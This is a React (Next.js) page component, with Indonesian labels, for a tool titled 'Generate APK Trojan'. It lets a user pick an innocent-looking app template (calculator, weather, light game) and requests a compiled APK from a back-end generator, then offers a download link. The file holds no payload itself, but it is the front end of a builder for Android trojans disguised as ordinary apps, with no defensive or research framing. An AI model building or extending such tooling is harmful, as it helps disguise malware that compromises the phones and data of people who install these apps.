"use client";
import { useState } from "react";

const templates = [
  { id: "calc", name: "Kalkulator", icon: "/icons/calc.png" },
  { id: "weather", name: "Cuaca", icon: "/icons/weather.png" },
  { id: "game", name: "Game Ringan", icon: "/icons/game.png" },
];

export default function GenerateAPKPage() {
  const [selected, setSelected] = useState(templates[0].id);
  const [loading, setLoading] = useState(false);
  const [downloadUrl, setDownloadUrl] = useState("");

  const handleGenerate = async () => {
    setLoading(true);
    const res = await fetch("/api/apk-generator", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ templateId: selected }),
    });
    const data = await res.json();
    if (data.success) setDownloadUrl(data.downloadUrl);
    setLoading(false);
  };

  return (
    <div>
      <h1>Generate APK Trojan</h1>
      <div>
        {templates.map(t => (
          <div key={t.id} onClick={() => setSelected(t.id)}>
            <img src={t.icon} alt={t.name} />
            <span>{t.name}</span>
          </div>
        ))}
      </div>
      <button onClick={handleGenerate} disabled={loading}>
        {loading ? "Compiling..." : "Buat APK"}
      </button>
      {downloadUrl && <a href={downloadUrl}>Download APK</a>}
    </div>
  );
}
